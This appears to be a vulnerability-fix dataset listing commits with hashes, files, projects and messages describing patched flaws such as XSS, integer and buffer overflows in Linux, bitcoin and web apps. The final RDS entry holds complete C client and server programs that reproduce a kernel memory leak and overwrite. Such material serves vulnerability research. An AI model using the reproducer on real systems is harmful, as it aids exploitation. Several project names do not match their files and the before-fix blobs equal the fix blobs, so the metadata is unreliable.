mm: memcg: Correct unregistring of events attached to the same eventfd\n\nThere is an issue when memcg unregisters events that were attached to the same eventfd:\n\n- On the first call mem_cgroup_usage_unregister_event() removes all   events attached to a given eventfd, and if there were no events left,   thresholds->primary would become NULL \n\n- Since there were several events registered, cgroups core will call   mem_cgroup_usage_unregister_event() again, but now kernel will oops,   as the function doesn't expect that threshold->primary may be NULL.\n\nThat's a good question whether mem_cgroup_usage_unregister_event() should actually remove all events in one go, but nowadays it can't do any better as cftype->unregister_event callback doesn't pass any private event-associated cookie. So, let's fix the issue by simply checking for threshold->primary.\n\nFWIW, w/o the patch the following oops may be observed:\n\n BUG: unable to handle kernel NULL pointer dereference at 0000000000000004  IP: [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  Pid: 574, comm: kworker/0:2 Not tainted 3.3.0-rc4+ #9 Bochs Bochs  RIP: 0010:[<ffffffff810be32c>]  [<ffffffff810be32c>] mem_cgroup_usage_unregister_event+0x9c/0x1f0  RSP: 0018:ffff88001d0b9d60  EFLAGS: 00010246  Process kworker/0:2 (pid: 574, threadinfo ffff88001d0b8000, task ffff88001de91cc0)  Call Trace:   [<ffffffff8107092b>] cgroup_event_remove+0x2b/0x60   [<ffffffff8103db94>] process_one_work+0x174/0x450   [<ffffffff8103e413>] worker_thread+0x123/0x2d0\n\nCc: stable <stable@vger.kernel.org> Signed-off-by: Anton Vorontsov <anton.vorontsov@linaro.org> Acked-by: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: Kirill A. Shutemov <kirill@shutemov.name> Cc: Michal Hocko <mhocko@suse.cz> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    86073d532aed656550cb731aa5b4288b126ae7a6
File(s) In Commit: 
    js/replication.js
Blob(s) In Commit: 
    3ea119a97f8b81392a0043703b0039377355f43e
Blob(s) Before Fix: 
    3ea119a97f8b81392a0043703b0039377355f43e
Projects:
    007durgesh219_moodle
    007durgesh219_phpmyadmin
Commit Message for 86073d532aed656550cb731aa5b4288b126ae7a6:
Do not put database names as html

======================================================================
Commit With Fix: 
    a9986b86c53de0582248b39605660fbba0c21a29
File(s) In Commit: 
    frontend/core/engine/javascript.php
Blob(s) In Commit: 
    b25b0a138a75915d19eb0e2775c5dcbde51a2d98
Blob(s) Before Fix: 
    b25b0a138a75915d19eb0e2775c5dcbde51a2d98
Projects:
    80tasks_forkcms
Commit Message for a9986b86c53de0582248b39605660fbba0c21a29:
XSS / LFI Fox

======================================================================
Commit With Fix: 
    d0772b70faaf8e9f2013b6c4273d94d5eac8047a
File(s) In Commit: 
    net/ipv6/xfrm6_tunnel.c
Blob(s) In Commit: 
    5502cc948dfbb3ddb1a97bed03bd5d2320a8b891
Blob(s) Before Fix: 
    5502cc948dfbb3ddb1a97bed03bd5d2320a8b891
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for d0772b70faaf8e9f2013b6c4273d94d5eac8047a:
[IPV6]: Fix slab corruption running ip6sic\n\nFrom: Eric Sesterhenn <snakebyte@gmx.de>\n\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dcdf4fd954e3213c355746fa15b7480461972308
File(s) In Commit: 
    taglib/toolkit/tbytevector.cpp
Blob(s) In Commit: 
    cb6a5a0fcf7f03b1f50e45bbf51ab04883bdba47
Blob(s) Before Fix: 
    cb6a5a0fcf7f03b1f50e45bbf51ab04883bdba47
Projects:
    121340129_taglib
Commit Message for dcdf4fd954e3213c355746fa15b7480461972308:
Avoid uint overflow in case the length + index is over UINT_MAX

======================================================================
Commit With Fix: 
    58854564c7b8672090c25c4b1677d08620d870f2
File(s) In Commit: 
    classes/ezjscajaxcontent.php
Blob(s) In Commit: 
    97610b16491e4f58b82933b08b400c610a425b80
Blob(s) Before Fix: 
    97610b16491e4f58b82933b08b400c610a425b80
Projects:
    Adcaelo_ezpublish-legacy
Commit Message for 58854564c7b8672090c25c4b1677d08620d870f2:
Fixed #019245: XSS exploit on eZJSCore RUN command

======================================================================
Commit With Fix: 
    fe7dbd2c104c37f6f3af7d9f1646a3c332aea4a4
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    2e1c751c4c496b635b4598c959d390f3edb0bc0a
Blob(s) Before Fix: 
    2e1c751c4c496b635b4598c959d390f3edb0bc0a
Projects:
    0x277F_inspircd
Commit Message for fe7dbd2c104c37f6f3af7d9f1646a3c332aea4a4:
Merge pull request #1 from nenolod/insp20\n\nDNS resolver hardening (insp20 branch)

======================================================================
Commit With Fix: 
    a206b0ea12eb4606b93323268fc81a4f1f952531
File(s) In Commit: 
    src/main.cpp
Blob(s) In Commit: 
    20aa069a79310042e232b064762c254fde2a3f4f
Blob(s) Before Fix: 
    20aa069a79310042e232b064762c254fde2a3f4f
Projects:
    0-admin_bitcoin
Commit Message for a206b0ea12eb4606b93323268fc81a4f1f952531:
Do not allow overwriting unspent transactions (BIP 30)\n\nIntroduce the following network rule:  * a block is not valid if it contains a transaction whose hash    already exists in the block chain, unless all that transaction's    outputs were already spent before said block.\n\nWarning: this is effectively a network rule change, with potential risk for forking the block chain. Leaving this unfixed carries the same risk however, for attackers that can cause a reorganisation in part of the network.\n\nThanks to Russell O'Connor and Ben Reeves.

======================================================================
Commit With Fix: 
    7f8c788aa70db98ac904f37fa4197fcabb802942
File(s) In Commit: 
    horizon/static/horizon/js/horizon.js
Blob(s) In Commit: 
    c47364a34ac92af93dcc83d7842a947dc6f693a4
Blob(s) Before Fix: 
    c47364a34ac92af93dcc83d7842a947dc6f693a4
Projects:
    1149608162_devstack
Commit Message for 7f8c788aa70db98ac904f37fa4197fcabb802942:
html escape the console log in refresh\n\nfixes bug 977944\n\n(cherry picked from commit ab2e27522aaeb0268fcc121bd3eff5a4485f313c)\n\nChange-Id: Ic6135ebc58b6c45d6336f0833717086e43d7cccb

======================================================================
Commit With Fix: 
    d50f2ab6f050311dbf7b8f5501b25f0bf64a439b
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    108c3af8617b534ef31ce81d65261f6e87bcbc35
Blob(s) Before Fix: 
    108c3af8617b534ef31ce81d65261f6e87bcbc35
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d50f2ab6f050311dbf7b8f5501b25f0bf64a439b:
ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c ("ext4: avoid divide by zero when trying to mount a corrupted file system") fixes CVE-2009-4307 by performing a sanity check on s_log_groups_per_flex, since it can be set to a bogus value by an attacker.\n\n	sbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex  	groups_per_flex = 1 << sbi->s_log_groups_per_flex \n\n	if (groups_per_flex < 2) { ... }\n\nThis patch fixes two potential issues in the previous commit.\n\n1) The sanity check might only work on architectures like PowerPC. On x86, 5 bits are used for the shifting amount.  That means, given a large s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36 is essentially 1 << 4 = 16, rather than 0.  This will bypass the check, leaving s_log_groups_per_flex and groups_per_flex inconsistent.\n\n2) The sanity check relies on undefined behavior, i.e., oversized shift. A standard-confirming C compiler could rewrite the check in unexpected ways.  Consider the following equivalent form, assuming groups_per_flex is unsigned for simplicity.\n\n	groups_per_flex = 1 << sbi->s_log_groups_per_flex  	if (groups_per_flex == 0 || groups_per_flex == 1) {\n\nWe compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will completely optimize away the check groups_per_flex == 0, leaving the patched code as vulnerable as the original.  GCC keeps the check, but there is no guarantee that future versions will do the same.\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    b92946e2919134ebe2a4083e4302236295ea2a73
File(s) In Commit: 
    drivers/net/macvtap.c
Blob(s) In Commit: 
    163559c16988329b57878b376d320a8ed8db5bfd
Blob(s) Before Fix: 
    163559c16988329b57878b376d320a8ed8db5bfd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b92946e2919134ebe2a4083e4302236295ea2a73:
macvtap: zerocopy: validate vectors before building skb\n\nThere're several reasons that the vectors need to be validated:\n\n- Return error when caller provides vectors whose num is greater than UIO_MAXIOV. - Linearize part of skb when userspace provides vectors grater than MAX_SKB_FRAGS. - Return error when userspace provides vectors whose total length may exceed - MAX_SKB_FRAGS * PAGE_SIZE.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>

======================================================================
Commit With Fix: 
    d52fc5dde171f030170a6cb78034d166b13c9445
File(s) In Commit: 
    security/commoncap.c
Blob(s) In Commit: 
    0ecf4ba321cbeaa812dadc6524e138bc40b866b3
Blob(s) Before Fix: 
    0ecf4ba321cbeaa812dadc6524e138bc40b866b3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d52fc5dde171f030170a6cb78034d166b13c9445:
fcaps: clear the same personality flags as suid when fcaps are used\n\nIf a process increases permissions using fcaps all of the dangerous personality flags which are cleared for suid apps should also be cleared. Thus programs given priviledge with fcaps will continue to have address space randomization enabled even if the parent tried to disable it to make it easier to attack.\n\nSigned-off-by: Eric Paris <eparis@redhat.com> Reviewed-by: Serge Hallyn <serge.hallyn@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    905ad269c55fc62bee3da29f7b1d1efeba8aa1e1
File(s) In Commit: 
    fs/proc/root.c
Blob(s) In Commit: 
    03102d978180eba68469ef01d13ad25465f5b796
Blob(s) Before Fix: 
    03102d978180eba68469ef01d13ad25465f5b796
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 905ad269c55fc62bee3da29f7b1d1efeba8aa1e1:
procfs: fix a vfsmount longterm reference leak\n\nkern_mount() doesn't pair with plain mntput()...\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    ff71173477e54774b5571015d49d944f51cb8a26
File(s) In Commit: 
    inc/html.php
Blob(s) In Commit: 
    022cd792a800cbc03d8866a6a757455592abb2eb
Blob(s) Before Fix: 
    022cd792a800cbc03d8866a6a757455592abb2eb
Projects:
    122800_dokuwiki
Commit Message for ff71173477e54774b5571015d49d944f51cb8a26:
escape target error message (SECURITY) FS#2487 FS#2488\n\nThe error message when a non-existant editor was tried to load wasn't escaped correctly, allowing to introduce arbitrary JavaScript to the output, leading to a XSS vulnerability.\n\nNote: the reported second XCRF vulnerability is the same bug, the xploit code simply uses JavaScript to extract a valid CSRF token from the site

======================================================================
Commit With Fix: 
    cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    9e5b71fda6ec0d726bd356bce1658f55091ebcf8
Blob(s) Before Fix: 
    9e5b71fda6ec0d726bd356bce1658f55091ebcf8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc:
net: sock: validate data_len before allocating skb in sock_alloc_send_pskb()\n\nWe need to validate the number of pages consumed by data_len, otherwise frags array could be overflowed by userspace. So this patch validate data_len and return -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    20e0fa98b751facf9a1101edaefbc19c82616a68
File(s) In Commit: 
    fs/nfs/nfs4proc.c
Blob(s) In Commit: 
    45df7d4a3acc1f92e18822b5285eb9d603ebe52b
Blob(s) Before Fix: 
    45df7d4a3acc1f92e18822b5285eb9d603ebe52b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 20e0fa98b751facf9a1101edaefbc19c82616a68:
Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data. res.acl_len contains both the bitmap and acl lenghts while acl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com> Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>

======================================================================
Commit With Fix: 
    ed8cd3b2cd61004cab85380c52b1817aca1ca49b
File(s) In Commit: 
    drivers/gpu/drm/i915/i915_gem_execbuffer.c
Blob(s) In Commit: 
    7c50e58175c027c6326081243ca3533f477fa612
Blob(s) Before Fix: 
    7c50e58175c027c6326081243ca3533f477fa612
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ed8cd3b2cd61004cab85380c52b1817aca1ca49b:
drm/i915: fix integer overflow in i915_gem_execbuffer2()\n\nOn 32-bit systems, a large args->buffer_count from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 8408c282 ("drm/i915: First try a normal large kmalloc for the temporary exec buffers").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>

======================================================================
Commit With Fix: 
    44afb3a04391a74309d16180d1e4f8386fdfa745
File(s) In Commit: 
    drivers/gpu/drm/i915/i915_gem_execbuffer.c
Blob(s) In Commit: 
    de431942ded4bb5a7b6f5a380e6009cd6b22b696
Blob(s) Before Fix: 
    de431942ded4bb5a7b6f5a380e6009cd6b22b696
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 44afb3a04391a74309d16180d1e4f8386fdfa745:
drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed ("drm/i915: Avoid allocation for execbuffer object list").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>

======================================================================
Commit With Fix: 
    c50ac050811d6485616a193eb0f37bfbd191cc89
File(s) In Commit: 
    mm/hugetlb.c
Blob(s) In Commit: 
    285a81e87ec853cef3c5c1a20400bfb35415a04b
Blob(s) Before Fix: 
    285a81e87ec853cef3c5c1a20400bfb35415a04b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c50ac050811d6485616a193eb0f37bfbd191cc89:
hugetlb: fix resv_map leak in error path\n\nWhen called for anonymous (non-shared) mappings, hugetlb_reserve_pages() does a resv_map_alloc().  It depends on code in hugetlbfs's vm_ops->close() to release that allocation.\n\nHowever, in the mmap() failure path, we do a plain unmap_region() without the remove_vma() which actually calls vm_ops->close().\n\nThis is a decent fix.  This leak could get reintroduced if new code (say, after hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to return an error.  But, I think it would have to unroll the reservation anyway.\n\nChristoph's test case:\n\n	http://marc.info/?l=linux-mm&m=133728900729735\n\nThis patch applies to 3.4 and later.  A version for earlier kernels is at https://lkml.org/lkml/2012/5/22/418.\n\nSigned-off-by: Dave Hansen <dave@linux.vnet.ibm.com> Acked-by: Mel Gorman <mel@csn.ul.ie> Acked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Reported-by: Christoph Lameter <cl@linux.com> Tested-by: Christoph Lameter <cl@linux.com> Cc: Andrea Arcangeli <aarcange@redhat.com> Cc: <stable@vger.kernel.org>	[2.6.32+] Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c
File(s) In Commit: 
    tools/hv/hv_kvp_daemon.c
Blob(s) In Commit: 
    d9834b36294373f88d29731350ccc9d384b41788
Blob(s) Before Fix: 
    d9834b36294373f88d29731350ccc9d384b41788
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c:
Tools: hv: verify origin of netlink connector message\n\nThe SuSE security team suggested to use recvfrom instead of recv to be certain that the connector message is originated from kernel.\n\nCVE-2012-2669\n\nSigned-off-by: Olaf Hering <olaf@aepfle.de> Signed-off-by: Marcus Meissner <meissner@suse.de> Signed-off-by: Sebastian Krahmer <krahmer@suse.de> Signed-off-by: K. Y. Srinivasan <kys@microsoft.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    7f5aa4f35e23fd37425b3a5041737cdf58f87385
File(s) In Commit: 
    libc/bionic/malloc_debug_leak.c
Blob(s) In Commit: 
    e5845023d4e993b19f9d4ae65922a458d77350d4
Blob(s) Before Fix: 
    e5845023d4e993b19f9d4ae65922a458d77350d4
Projects:
    0-T-0_ps4-linux
    0-kaladin_build
    0-kaladin_system_core
    00day0_android_frameworks_base
Commit Message for 7f5aa4f35e23fd37425b3a5041737cdf58f87385:
bionic: fix integer overflows in chk_malloc(), leak_malloc(), and leak_memalign()\n\nThe allocation size in chk_malloc(), leak_malloc(), and leak_memalign() functions may be rounded up to a small value, leading to buffer overflows. The code only runs in debugging mode.\n\nThis patch complements commit 6f04a0f4 (CVE-2009-0607).\n\nChange-Id: Id899bcd2bcd2ea2205e5753c433390710032dc83 Signed-off-by: Xi Wang <xi.wang@gmail.com>

======================================================================
Commit With Fix: 
    9e2dcf72023d1447f09c47d77c99b0c49659e5ce
File(s) In Commit: 
    net/ipv6/netfilter/nf_conntrack_reasm.c
Blob(s) In Commit: 
    f1171b744650e07f1e979a9575e5792ebaa10a9b
Blob(s) Before Fix: 
    f1171b744650e07f1e979a9575e5792ebaa10a9b
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 9e2dcf72023d1447f09c47d77c99b0c49659e5ce:
netfilter: nf_conntrack_reasm: properly handle packets fragmented into a single fragment\n\nWhen an ICMPV6_PKT_TOOBIG message is received with a MTU below 1280, all further packets include a fragment header.\n\nUnlike regular defragmentation, conntrack also needs to "reassemble" those fragments in order to obtain a packet without the fragment header for connection tracking. Currently nf_conntrack_reasm checks whether a fragment has either IP6_MF set or an offset != 0, which makes it ignore those fragments.\n\nRemove the invalid check and make reassembly handle fragment queues containing only a single fragment.\n\nReported-and-tested-by: Ulrich Weber <uweber@astaro.com> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    79549c6dfda0603dba9a70a53467ce62d9335c33
File(s) In Commit: 
    kernel/cred.c
Blob(s) In Commit: 
    e70683d9ec32f00bf58a0ea2dc64be2d74fb8415
Blob(s) Before Fix: 
    e70683d9ec32f00bf58a0ea2dc64be2d74fb8415
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 79549c6dfda0603dba9a70a53467ce62d9335c33:
cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring, it should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and the new child gets the bogus ->replacement_session_keyring copied by dup_task_struct(). This is obviously wrong and, if nothing else, this leads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails before this point the wrong ->replacement_session_keyring doesn't matter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org> Signed-off-by: Oleg Nesterov <oleg@redhat.com> Acked-by: David Howells <dhowells@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80
File(s) In Commit: 
    file/edit_html.cgi
Blob(s) In Commit: 
    c249bea1e0cbafa105b632d9e1f19e6334ae0ad1
Blob(s) Before Fix: 
    c249bea1e0cbafa105b632d9e1f19e6334ae0ad1
Projects:
    Anialation81_webmin
Commit Message for 4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80:
Add access control check when reading HTML file https://sourceforge.net/tracker/index.php?func=detail&aid=3542038&group_id=17457&atid=117457#

======================================================================
Commit With Fix: 
    67de956ff5dc1d4f321e16cfbd63f5be3b691b43
File(s) In Commit: 
    net/nfc/nci/ntf.c
Blob(s) In Commit: 
    2ab196a9f228ac873238c2a060685bacea62b87a
Blob(s) Before Fix: 
    2ab196a9f228ac873238c2a060685bacea62b87a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 67de956ff5dc1d4f321e16cfbd63f5be3b691b43:
NFC: Prevent multiple buffer overflows in NCI\n\nFix multiple remotely-exploitable stack-based buffer overflows due to the NCI code pulling length fields directly from incoming frames and copying too much data into statically-sized arrays.\n\nSigned-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com> Cc: stable@kernel.org Cc: security@kernel.org Cc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Cc: David S. Miller <davem@davemloft.net> Acked-by: Ilan Elias <ilane@ti.com> Signed-off-by: Samuel Ortiz <sameo@linux.intel.com>

======================================================================
Commit With Fix: 
    a524967e8d5c4c22e49cd619aed20c87a316c0be
File(s) In Commit: 
    src/lib/Server/Plugins/Trigger.py
Blob(s) In Commit: 
    b173031fe9cf3dc7b7a619c3a46001335f05314e
Blob(s) Before Fix: 
    b173031fe9cf3dc7b7a619c3a46001335f05314e
Projects:
    0_bcfg2
Commit Message for a524967e8d5c4c22e49cd619aed20c87a316c0be:
fixed major security flaw in Trigger plugin

======================================================================
Commit With Fix: 
    034762e8060dcf0a11cb039b9d426b0d0bb1801d
File(s) In Commit: 
    nova/scheduler/filters/affinity_filter.py
Blob(s) In Commit: 
    03bf0dd6eeed24a74dd67444e12bf6c4a29e9152
Blob(s) Before Fix: 
    03bf0dd6eeed24a74dd67444e12bf6c4a29e9152
Projects:
    2020human_nova
Commit Message for 034762e8060dcf0a11cb039b9d426b0d0bb1801d:
Use compute_api.get_all in affinity filters.\n\nUpdates the affinity filters so they make a single compute API call to lookup instance host information rather than single lookups for each UUID.\n\nThis resolves a potential performance issue which can cause a scheduler to hang while processing requests which contain large numbers of UUID's in the scheduler_hints.\n\nFixes LP Bug #1017795.\n\nChange-Id: I30f434faf109058573ee41c4a6abce2e48939e8d

======================================================================
Commit With Fix: 
    13d518074a952d33d47c428419693f63389547e9
File(s) In Commit: 
    fs/eventpoll.c
Blob(s) In Commit: 
    c0b3c70ee87a2b8e0e46c01a87d63ac692aecc71
Blob(s) Before Fix: 
    c0b3c70ee87a2b8e0e46c01a87d63ac692aecc71
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 13d518074a952d33d47c428419693f63389547e9:
epoll: clear the tfile_check_list on -ELOOP\n\nAn epoll_ctl(,EPOLL_CTL_ADD,,) operation can return '-ELOOP' to prevent circular epoll dependencies from being created.  However, in that case we do not properly clear the 'tfile_check_list'.  Thus, add a call to clear_tfile_check_list() for the -ELOOP case.\n\nSigned-off-by: Jason Baron <jbaron@redhat.com> Reported-by: Yurij M. Plotnikov <Yurij.Plotnikov@oktetlabs.ru> Cc: Nelson Elhage <nelhage@nelhage.com> Cc: Davide Libenzi <davidel@xmailserver.org> Tested-by: Alexandra N. Kossovsky <Alexandra.Kossovsky@oktetlabs.ru> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    d16d4623edb210635bec3ca3786481b82cde25a2
File(s) In Commit: 
    mcs/class/System.Web/System.Web/HttpForbiddenHandler.cs
Blob(s) In Commit: 
    7e87d487a607a0b942f32830e5ab7011425700f3
Blob(s) Before Fix: 
    7e87d487a607a0b942f32830e5ab7011425700f3
Projects:
    0-T-0_ps4-linux
    004307ec_mono
Commit Message for d16d4623edb210635bec3ca3786481b82cde25a2:
HtmlEncode the path\n\n	Fixes Novell bug #769799.

======================================================================
Commit With Fix: 
    06b6a1cf6e776426766298d055bb3991957d90a7
File(s) In Commit: 
    net/rds/recv.c
Blob(s) In Commit: 
    9f0f17cf6bf9b16e95c7a89d1bc452a0e4c0aada
Blob(s) Before Fix: 
    9f0f17cf6bf9b16e95c7a89d1bc452a0e4c0aada
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 06b6a1cf6e776426766298d055bb3991957d90a7:
rds: set correct msg_namelen\n\nJay Fenlason (fenlason@redhat.com) found a bug, that recvfrom() on an RDS socket can return the contents of random kernel memory to userspace if it was called with a address length larger than sizeof(struct sockaddr_in). rds_recvmsg() also fails to set the addr_len paramater properly before returning, but that's just a bug. There are also a number of cases wher recvfrom() can return an entirely bogus address. Anything in rds_recvmsg() that returns a non-negative value but does not go through the "sin = (struct sockaddr_in *)msg->msg_name " code path at the end of the while(1) loop will return up to 128 bytes of kernel memory to userspace.\n\nAnd I write two test programs to reproduce this bug, you will see that in rds_server, fromAddr will be overwritten and the following sock_fd will be destroyed. Yes, it is the programmer's fault to set msg_namelen incorrectly, but it is better to make the kernel copy the real length of address to user space in such case.\n\nHow to run the test programs ? I test them on 32bit x86 system, 3.5.0-rc7.\n\n1 compile gcc -o rds_client rds_client.c gcc -o rds_server rds_server.c\n\n2 run ./rds_server on one console\n\n3 run ./rds_client on another console\n\n4 you will see something like: server is waiting to receive data... old socket fd=3 server received data from client:data from client msg.msg_namelen=32 new socket fd=-1067277685 sendmsg() : Bad file descriptor\n\n/***************** rds_client.c ********************/\n\nint main(void) { 	int sock_fd  	struct sockaddr_in serverAddr  	struct sockaddr_in toAddr  	char recvBuffer[128] = "data from client"  	struct msghdr msg  	struct iovec iov \n\n	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0)  	if (sock_fd < 0) { 		perror("create socket error\n")  		exit(1)  	}\n\n	memset(&serverAddr, 0, sizeof(serverAddr))  	serverAddr.sin_family = AF_INET  	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	serverAddr.sin_port = htons(4001) \n\n	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror("bind() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	memset(&toAddr, 0, sizeof(toAddr))  	toAddr.sin_family = AF_INET  	toAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	toAddr.sin_port = htons(4000)  	msg.msg_name = &toAddr  	msg.msg_namelen = sizeof(toAddr)  	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = strlen(recvBuffer) + 1  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0 \n\n	if (sendmsg(sock_fd, &msg, 0) == -1) { 		perror("sendto() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("client send data:%s\n", recvBuffer) \n\n	memset(recvBuffer, '\0', 128) \n\n	msg.msg_name = &toAddr  	msg.msg_namelen = sizeof(toAddr)  	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = 128  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0  	if (recvmsg(sock_fd, &msg, 0) == -1) { 		perror("recvmsg() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("receive data from server:%s\n", recvBuffer) \n\n	close(sock_fd) \n\n	return 0  }\n\n/***************** rds_server.c ********************/\n\nint main(void) { 	struct sockaddr_in fromAddr  	int sock_fd  	struct sockaddr_in serverAddr  	unsigned int addrLen  	char recvBuffer[128]  	struct msghdr msg  	struct iovec iov \n\n	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0)  	if(sock_fd < 0) { 		perror("create socket error\n")  		exit(0)  	}\n\n	memset(&serverAddr, 0, sizeof(serverAddr))  	serverAddr.sin_family = AF_INET  	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	serverAddr.sin_port = htons(4000)  	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror("bind error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("server is waiting to receive data...\n")  	msg.msg_name = &fromAddr \n\n	/* 	 * I add 16 to sizeof(fromAddr), ie 32, 	 * and pay attention to the definition of fromAddr, 	 * recvmsg() will overwrite sock_fd, 	 * since kernel will copy 32 bytes to userspace. 	 * 	 * If you just use sizeof(fromAddr), it works fine. 	 * */ 	msg.msg_namelen = sizeof(fromAddr) + 16  	/* msg.msg_namelen = sizeof(fromAddr)  */ 	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = 128  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0 \n\n	while (1) { 		printf("old socket fd=%d\n", sock_fd)  		if (recvmsg(sock_fd, &msg, 0) == -1) { 			perror("recvmsg() error\n")  			close(sock_fd)  			exit(1)  		} 		printf("server received data from client:%s\n", recvBuffer)  		printf("msg.msg_namelen=%d\n", msg.msg_namelen)  		printf("new socket fd=%d\n", sock_fd)  		strcat(recvBuffer, "--data from server")  		if (sendmsg(sock_fd, &msg, 0) == -1) { 			perror("sendmsg()\n")  			close(sock_fd)  			exit(1)  		} 	}\n\n	close(sock_fd)  	return 0  }\n\nSigned-off-by: Weiping Pan <wpan@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
